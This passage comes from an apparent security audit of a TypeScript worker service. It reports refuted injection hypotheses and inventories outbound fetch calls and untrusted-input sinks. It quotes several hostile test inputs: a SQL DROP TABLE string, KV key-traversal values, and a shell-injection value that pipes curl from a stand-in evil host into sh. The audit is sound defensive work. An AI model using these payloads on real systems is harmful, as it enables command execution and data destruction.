  invokes the **inherited `__proto__` accessor**, which sets _this object's_ prototype. It creates no
  own property, `JSON.stringify` drops it, and `Object.prototype` is untouched. PoC asserts
  `({}).state === undefined` afterwards and that the serialized `config` is `{}`.
- `constructor` / `prototype` / `toString` create ordinary **own shadowing properties** on the local
  object. They round-trip through JSON but do not escape the object.
- The downstream merge (`merge.ts:24-54`) is `out[key] = …` on a fresh `{...base}` — same analysis.

Net effect is a silent data-loss bug (`__proto__` overrides vanish), not a security issue.
Still worth an allowlist (`/^[A-Za-z][A-Za-z0-9_.-]*$/`) on catalog keys at publish time.

### RF-2 — KV key injection / cross-namespace collision (hypothesis 5) — **REFUTED**

PoC `R9-10`. Full key inventory:

| Key                                                                | Attacker-controlled component |
| ------------------------------------------------------------------ | ----------------------------- |
| `admin:flow:${state}` (`admin/auth.ts:30`)                         | `state` (query)               |
| `portal:oidc-flow:${state}` (`portal/auth.ts:24`)                  | `state` (query)               |
| `portal:magic:${token}` (`portal/auth.ts:25`)                      | `token` (query, on read)      |
| `p:${product}:flow:${state}` (`oidc.ts:190-192`)                   | `state`                       |
| `p:${product}:device-flow:${code}` (`oidc.ts:194-196`)             | `code` / `body.deviceCode`    |
| `p:${product}:token:${hash}` (`kv.ts:8-10`)                        | hash only                     |
| `p:${product}:browser-session:${hash}` (`browserSession.ts:50-51`) | hash only                     |
| `p:${product}:gh-token:${installId}` (`githubApp.ts:210`)          | numeric (but see R9-15)       |

Every attacker-controlled value is the **final** segment of its key, and no namespace prefix is a
prefix of another (`flow:` vs `device-flow:` vs `token:` vs `browser-session:` differ at their first
character). `product` comes from the router's `[a-z0-9-]+` capture (`router.ts:89`) and must resolve
to a real product row. PoC plants a `device-flow` and a `token` record and shows that
`state = "../device-flow:VICTIM"`, `":device-flow:VICTIM"`, `"..:token:VICTIMHASH"` all return 400
"unknown state" and leave the victim records intact. **The only key-injection primitive found is
R9-15.**

### RF-3 — SQL injection via dynamic `SET ${col} = ?` (hypothesis 6) — **REFUTED**

`packages/worker/src/admin/repo.ts:35-49` (`updateProduct`) and `:152-166` (`patchLicense`) build
`sets.push(\`${col} = ?\`)`from`Object.entries(fields)`. Verified both call sites:

- `admin/handlers/products.ts:178-198` — an object literal with **seven hardcoded keys**, each value
  guarded by a `typeof` check.
- `admin/handlers/licenses.ts:231-269` — an object literal with **eight hardcoded keys**, same
  pattern.

Neither spreads request data into the field object (PoC asserts the negative regex). Values are
always bound (`D1Db.stmt` at `db/d1.ts:8-10`; `SqliteDb` likewise) — PoC round-trips
`x'); DROP TABLE products; --` intact.

**Latent hazard, not a finding:** the signature is `Partial<Pick<Row, …>>`, so TypeScript is the
only thing preventing a future `updateProduct(db, slug, {...body})`. An explicit runtime column
allowlist inside `updateProduct`/`patchLicense` would make it structurally safe.

### RF-4 — Unauthenticated stored XSS via `auth_page_template` (hypothesis 3) — **REFUTED as reachable**

See R9-11: the route and the missing headers are real, but **no code path writes the column**. The
only INSERT hardcodes `NULL` (`repo.ts:591-592`); no admin handler, manifest field, or migration
seeds it. Downgraded from "unauthenticated stored XSS" to "latent sink + missing security headers".

### RF-5 — XML injection into the appcast (hypothesis 8) — **REFUTED as reachable**

See R9-08: the CDATA break-out works, but `descriptionHtml` is never populated
(`release/index.ts:581-583` passes only `title`). Latent.

### RF-6 — `safeReturnTo` open redirect (part of hypothesis 4) — **REFUTED**

The origin comparison is sound against `//host`, `https://a.b.evil`, `javascript:`, and
backslash-confusion payloads (PoC). The only real issue is the `/manage` policy divergence (R9-06).

---

## Appendix A — Complete outbound `fetch()` inventory

Every outbound network call in `packages/worker/src`, with the provenance of its URL.

| #   | Site                                                       | URL expression                                                                 | URL source                                                                              | Credential carried                           | Guard                                        |
| --- | ---------------------------------------------------------- | ------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------- | -------------------------------------------- | -------------------------------------------- |
| 1   | `oidc.ts:710-724`                                          | `` `${oidc.issuer}/api/oidc/token` ``                                          | **D1 `oidc_config.issuer`** ← repo manifest                                             | **product OIDC `client_secret`** + auth code | ❌ none → **R9-01**                          |
| 2   | `oidc.ts:743-745`                                          | `` `${oidc.issuer}/.well-known/jwks.json` `` (via `jose` `createRemoteJWKSet`) | same                                                                                    | none                                         | ❌ none → **R9-01**                          |
| 3   | `oidc.ts:512-526` _(redirect, not fetch)_                  | `` `${oidc.issuer}/authorize` ``                                               | same                                                                                    | `client_id`                                  | ❌ none → **R9-02**                          |
| 4   | `portal/auth.ts:241-255`                                   | `` `${cfg.issuer}/api/oidc/token` ``                                           | `env.PLATFORM_OIDC_ISSUER` / `ADMIN_OIDC_ISSUER`                                        | platform `client_secret`                     | ✅ env-only                                  |
| 5   | `portal/auth.ts:261-263`                                   | `` `${cfg.issuer}/.well-known/jwks.json` ``                                    | env                                                                                     | none                                         | ✅ env-only                                  |
| 6   | `admin/auth.ts:98-112`                                     | `` `${cfg.issuer}/api/oidc/token` ``                                           | env                                                                                     | platform `client_secret`                     | ✅ env-only                                  |
| 7   | `admin/auth.ts:116-118`                                    | `` `${cfg.issuer}/.well-known/jwks.json` ``                                    | env                                                                                     | none                                         | ✅ env-only                                  |
| 8   | `release/githubApp.ts:148-153`                             | `` `${GITHUB_API}/repos/${owner}/${repo}/installation` ``                      | `parseRepoUrl(body.repoUrl)` (platform admin)                                           | **GitHub App JWT**                           | ❌ unencoded → **R9-04**                     |
| 9   | `release/githubApp.ts:219-221`                             | `` `${GITHUB_API}/app/installations/${installId}/access_tokens` ``             | D1 numeric / GitHub API                                                                 | GitHub App JWT                               | ✅ numeric                                   |
| 10  | `release/github.ts:60-67` (`resolveRelease`)               | `` `${GITHUB_API}/repos/${owner}/${repo}/releases/{latest,tags/v<v>}` ``       | D1 `release_config`; version is `encodeURIComponent`'d                                  | installation token                           | ⚠️ owner/repo unencoded → R9-04              |
| 11  | `release/github.ts:80-83` (`listReleases`)                 | `` `${GITHUB_API}/repos/${owner}/${repo}/releases?per_page=N` ``               | D1; `perPage` is a literal                                                              | installation token                           | ⚠️ R9-04                                     |
| 12  | `release/github.ts:118-119` (`streamAsset`)                | `` `${GITHUB_API}/repos/${owner}/${repo}/releases/assets/${assetId}` ``        | D1 + numeric asset id                                                                   | installation token                           | ⚠️ R9-04                                     |
| 13  | `release/github.ts:131` (`streamAsset` redirect follow)    | `Location` from GitHub                                                         | GitHub response header                                                                  | **none** (deliberate)                        | ✅ `isAllowedStorageHost` (`:88-95`)         |
| 14  | `release/github.ts:177-183` (`fetchRepoFile`)              | `` `${GITHUB_API}/repos/${owner}/${repo}/contents/${path…}` ``                 | D1 / parsed URL                                                                         | installation token                           | ✅ `path` segment-encoded; ⚠️ owner/repo not |
| 15  | `release/github.ts:207-211` (`fetchTextAsset`)             | asset URL                                                                      | D1 + numeric                                                                            | installation token                           | ⚠️ R9-04                                     |
| 16  | `release/github.ts:218` (`fetchTextAsset` redirect follow) | `Location`                                                                     | GitHub                                                                                  | none                                         | ✅ `isAllowedStorageHost`                    |
| 17  | `release/index.ts:350`                                     | `` `${base}/actions/workflows/${channel_workflow}/runs?…` ``                   | **D1 `release_config.channel_workflow`** ← repo manifest                                | installation token                           | ❌ unencoded → **R9-03**                     |
| 18  | `release/index.ts:352`                                     | `` `${base}/pulls/${sel.pr}` ``                                                | route regex `^pr-(\d{1,7})$` → `Number`                                                 | installation token                           | ✅ numeric                                   |
| 19  | `release/index.ts:355`                                     | same template, `head_sha` from GitHub                                          | manifest + GitHub                                                                       | installation token                           | ❌ unencoded → **R9-03**                     |
| 20  | `release/health.ts:166-179`                                | delegates to #10/#11                                                           | D1                                                                                      | installation token                           | ⚠️ inherits R9-04                            |
| 21  | `rateLimit.ts:24`                                          | `"https://rl/check"` (Durable Object stub)                                     | **literal**                                                                             | none                                         | ✅                                           |
| 22  | `portal/index.ts:43`                                       | `env.ASSETS.fetch(new Request(url, req))`                                      | `url.pathname` (WHATWG-normalized, incl. `%2e%2e`)                                      | none                                         | ✅ binding, not network                      |
| 23  | `admin/index.ts:53`                                        | `env.ASSETS.fetch(new Request(url, req))`                                      | same                                                                                    | none                                         | ✅ binding, not network                      |
| 24  | `portal/email.ts:26,43`                                    | `env.EMAIL.send({from,to,…})`                                                  | `to` = account email (regex-validated at `portal/auth.ts:332`, no whitespace ⇒ no CRLF) | —                                            | ✅                                           |

**Egress summary:** the only outbound URLs whose **host** is not a compile-time constant or an env
var are #1, #2 and #3 — all three read `oidc_config.issuer`. That is the entire SSRF surface, and it
is R9-01.

## Appendix B — Untrusted-input sink inventory

**→ HTML** (`text/html` responses): `edgeMint.ts:254` (raw D1 column, **no headers** — R9-11);
`oidc.ts:640-660` (escaped, **no headers** — R9-12c); `oidc.ts:817-820` (static, no headers);
`portal/index.ts:13-29` (static + headers ✅); `portal/auth.ts:39-52` (literal messages + headers ✅);
`admin/auth.ts:138-143` (literal messages, **no headers**); `admin/index.ts:27-40` (static + headers ✅);
`portal/email.ts:31,48` (escaped, email body).

**→ redirect `Location`**: `oidc.ts:544` (issuer — R9-02); `oidc.ts:633` (stored issuer URL — R9-02);
`oidc.ts:809` (`safeReturnTo`, same-origin — R9-06); `portal/api.ts:683` (**D1, no allowlist** —
R9-05a); `portal/auth.ts:157` (`safeReturnTo`), `:213` (env issuer), `:404` (literal `/`);
`admin/auth.ts:183` (env issuer), `:230` (literal `/manage/`).

**→ KV key**: 8 builders, all enumerated in RF-2. Only R9-15 injects.

**→ D1**: all values parameterized (`db/d1.ts`, `db/sqlite.ts`). Two dynamic-identifier builders
(`admin/repo.ts:39`, `:155`) fed exclusively by hardcoded literals — RF-3. One dynamic `IN (…)`
placeholder list built from `products.map(() => "?")` (`portal/repo.ts:531`) — count-derived, safe.

**→ XML**: `release/appcast.ts` — everything `xmlEscape`d except the unreachable CDATA (R9-08).

**→ shell**: `release/install.ts` renders a `curl | sh` script. `applyInstallTemplate` (`:29-40`)
substitutes `{{binaryName}}`, `{{origin}}`, `{{cliBase}}`, `{{versionEnv}}`, `{{channels}}` into an
operator-supplied `release_config.install_template`, and `defaultInstallScript` (`:46-143`)
interpolates `binaryName` (from the manifest or the repo name) into shell double-quoted strings and
a `case` pattern. **`install_template` has no writer** (grep: only read at `release/index.ts:400`;
`stmtInsertReleaseConfig` at `repo.ts:556-577` hardcodes `NULL` in that column position) and `binaryName` reaches the script
unquoted-but-inside-double-quotes. Not reported as a finding — no injection path exists today — but
if a manifest `binaryName` ever becomes arbitrary (it is `String(rel.binaryName ?? "")` in
`shared-manifest/src/index.ts:752`, **unvalidated**), `binaryName = 'x"; curl evil|sh; #'` would
inject into the served installer. Recommend a `/^[A-Za-z0-9._-]{1,64}$/` guard on `binaryName` at
ingest.

## Appendix C — Reproduction

```bash
export PATH="$HOME/.local/share/mise/installs/node/22/bin:$PATH"
cd packages/worker
npx vitest run test/attack/R9-injection.test.ts     # 32/32
```

Full worker suite after adding the PoCs: 622/624 (the 2 failures are in
`test/attack/R11-data.test.ts`, another lane's file — unrelated to this one; no source files were
modified by R9).
